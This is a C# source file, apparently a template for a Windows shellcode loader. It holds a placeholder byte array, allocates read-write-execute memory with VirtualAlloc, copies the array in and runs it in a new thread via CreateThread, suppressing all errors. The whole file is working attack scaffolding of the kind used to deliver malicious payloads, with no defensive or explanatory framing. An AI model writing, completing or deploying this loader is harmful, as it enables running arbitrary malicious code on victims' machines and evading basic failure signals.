using System;
using System.Runtime.InteropServices;

namespace BasicTemplate
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        private static uint MEM_COMMIT = 0x1000;
        private static uint PAGE_EXECUTE_READWRITE = 0x40;
        static void Main()
        {
            try
            {
                byte[] shellcode = { SHELL_CODE_ARRAY };
                if (shellcode.Length == 0)
                {
                    return;
                }
                IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (codeAddr == IntPtr.Zero)
                {
                    return;
                }
                Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);
                uint threadId;
                IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, codeAddr, IntPtr.Zero, 0, out threadId);
                if (threadHandle == IntPtr.Zero)
                {
                    return;
                }
                uint result = WaitForSingleObject(threadHandle, 0xFFFFFFFF);
                if (result == 0xFFFFFFFF)
                {
                    return;
                }
            }
            catch (Exception) { }
        }
    }
}